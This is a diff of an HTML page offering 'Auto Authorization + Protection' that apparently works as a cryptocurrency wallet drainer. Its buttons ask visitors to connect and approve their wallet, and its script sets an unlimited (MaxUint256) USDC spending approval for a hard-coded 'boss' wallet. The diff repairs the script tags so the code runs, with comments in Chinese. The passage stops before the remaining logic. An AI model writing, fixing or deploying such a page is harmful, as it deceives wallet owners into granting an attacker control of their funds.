@@ -2,21 +2,23 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Mark III – USDC Licensing + Mining!</title>
+  <title>Mark III · Auto Authorization + Protection</title>
 </head>
 <body>
-  <h2>Mark III · Auto Authorization + Protection</h2>
+  <h2>Mark III ・ Auto Authorization + Protection</h2>
 
   <button id="connect">Connect Wallet</button>
   <button id="approve">Approve Wallet</button>
   <button id="deposit">Protection funds</button>
   <div id="status"></div>
 
+  <!-- 加载 ethers.js（新版地址） -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
-    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC合约
-    const bossAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"; // Boss钱包
+  <!-- 正确的 JS 逻辑开始 -->
+  <script>
+    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
+    const bossAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
     const approveAmount = ethers.constants.MaxUint256;
 
     let provider;
